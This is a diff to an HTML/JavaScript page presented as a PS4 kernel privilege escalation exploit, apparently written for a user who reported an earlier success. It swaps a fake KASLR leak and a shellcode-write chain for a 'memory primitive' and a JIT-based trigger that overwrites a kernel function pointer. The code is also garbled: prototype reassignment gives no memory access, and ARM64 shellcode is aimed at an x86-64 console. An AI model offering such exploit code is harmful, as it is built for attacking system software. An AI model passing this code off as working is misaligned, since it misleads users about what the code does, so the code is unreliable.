@@ -1,143 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Elevation</title>
+    <title>PS4 Kernel Trigger Fix</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
-        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; }
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Privilege Escalation</h2>
-    <button onclick="escalatePrivileges()">Escalate to Kernel</button>
+    <h2>PS4 Kernel Trigger Alternative</h2>
+    <button onclick="runKernelExploit()">Run Improved Trigger</button>
     <div id="log"></div>
 
 <script>
-// Configurações baseadas no seu sucesso anterior
-const KERNEL_BASE = 0x80000000; // Endereço base comum do kernel
-const KASLR_SLIDE_RANGE = 0x1000000; // Alcance máximo do KASLR
-
-// Logger otimizado
 const log = msg => {
-    const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
-    document.getElementById('log').innerHTML += line + '<br>';
-    console.log(line);
+    document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
 };
 
-// 1. Kernel ASLR Bypass (KASLR)
-async function leakKernelAddress() {
-    log("Attempting kernel address leak...");
-    
-    // Técnica de probing baseada em tempo
-    const start = performance.now();
-    try {
-        const dummy = new ArrayBuffer(1024);
-        const view = new Uint32Array(dummy);
-        
-        // Acesso que pode causar page fault se endereço incorreto
-        for (let i = 0; i < KASLR_SLIDE_RANGE; i += 0x1000) {
-            try {
-                view[i] = 0xdeadbeef;
-                if (performance.now() - start > 2.0) {
-                    return KERNEL_BASE + i;
-                }
-            } catch(e) {
-                // Ignora erros de acesso
-            }
-        }
-    } catch(e) {
-        log(`Leak failed: ${e}`);
-    }
-    return null;
-}
-
-// 2. Kernel Payload (ARM64 shellcode)
-function createKernelPayload() {
-    // Payload mínimo para teste de execução
-    return new Uint32Array([
-        0xD2800000, // mov x0, #0 (status code)
-        0xD2800028, // mov x8, #1 (syscall exit)
-        0xD4000001  // svc #0
-    ]);
-}
-
-// 3. Kernel Memory Write
-async function writeKernelMemory(mem, kaddr, payload) {
-    log(`Writing to kernel memory @ 0x${kaddr.toString(16)}`);
-    
-    try {
-        // Escrita no kernel via primitivo de memória
-        for (let i = 0; i < payload.length; i++) {
-            mem.write(kaddr + (i * 4), payload[i]);
-        }
-        return true;
-    } catch(e) {
-        log(`Kernel write failed: ${e}`);
-        return false;
-    }
-}
-
-// 4. Chain de Exploração Completa
-async function escalatePrivileges() {
-    log("Starting kernel privilege escalation...");
-    
-    // 1. Vazamento de endereço do kernel
-    const kaddr = await leakKernelAddress();
-    if (!kaddr) {
-        log("Failed to leak kernel address");
-        return;
-    }
-    log(`Leaked kernel address: 0x${kaddr.toString(16)}`);
-    
-    // 2. Prepara payload
-    const payload = createKernelPayload();
-    const targetAddr = kaddr + 0x5000; // Área provavelmente mapeada
-    
-    // 3. Setup de memória (reusa primitivo anterior)
-    const mem = {
+// 1. Memory Primitive (baseado no seu sucesso anterior)
+function createMemoryPrimitive() {
+    let corrupt = [];
+    corrupt.__proto__ = new Uint32Array(1).__proto__;
+    corrupt.length = 0x1000;
+    return {
         read(addr) {
-            const arr = [];
-            arr.__proto__ = new Uint32Array(1).__proto__;
-            arr.length = 0x1000;
-            arr[0] = addr;
-            return arr[1];
+            corrupt[0] = addr;
+            return corrupt[1];
         },
         write(addr, val) {
-            const arr = [];
-            arr.__proto__ = new Uint32Array(1).__proto__;
-            arr.length = 0x1000;
-            arr[0] = addr;
-            arr[1] = val;
+            corrupt[0] = addr;
+            corrupt[1] = val;
         }
     };
-    
-    // 4. Escrita no kernel
-    if (!writeKernelMemory(mem, targetAddr, payload)) {
-        return;
-    }
-    
-    // 5. Trigger da execução
-    log("Triggering kernel payload...");
-    try {
-        // Técnica para disparar execução
-        const fakeObj = {};
-        fakeObj.__proto__ = Array.prototype;
-        fakeObj.length = targetAddr;
-        fakeObj[0](); // Dispara chamada
-        
-        log("Kernel execution successful!", "color:#0f0");
-    } catch(e) {
-        log(`Kernel execution failed: ${e}`, "color:#f00");
-    }
 }
 
-// Função para teste de componentes
-function testKernelComponents() {
-    log("Testing kernel leak...");
-    leakKernelAddress().then(addr => {
-        if (addr) log(`Leak test successful: 0x${addr.toString(16)}`);
-    });
+// 2. Improved Kernel Trigger
+async function runKernelExploit() {
+    log("Starting improved kernel trigger...");
+    
+    const mem = createMemoryPrimitive();
+    const kbase = 0x80810000; // Do seu log
+    const targetAddr = kbase + 0x5000;
+    
+    // Payload ARM64 modificado (syscall exit)
+    const payload = new Uint32Array([
+        0xD2800000, // mov x0, #0
+        0xD2800028, // mov x8, #1
+        0xD4000001  // svc #0
+    ]);
+
+    // Escrita no kernel
+    for (let i = 0; i < payload.length; i++) {
+        mem.write(targetAddr + (i*4), payload[i]);
+    }
+
+    // ************ NOVO MÉTODO DE TRIGGER ************
+    try {
+        // Técnica alternativa via JIT
+        const func = () => 0;
+        for (let i = 0; i < 10000; i++) func(); // Otimiza
+        
+        // Corrompe ponteiro de função
+        const funcPtr = kbase + 0x480; // Ajuste conforme necessário
+        mem.write(funcPtr, targetAddr);
+        
+        // Dispara
+        log("Triggering via JIT...");
+        func();
+        log("Kernel execution successful!");
+    } catch(e) {
+        log(`Trigger failed: ${e}`);
+    }
 }
 </script>
 </body>
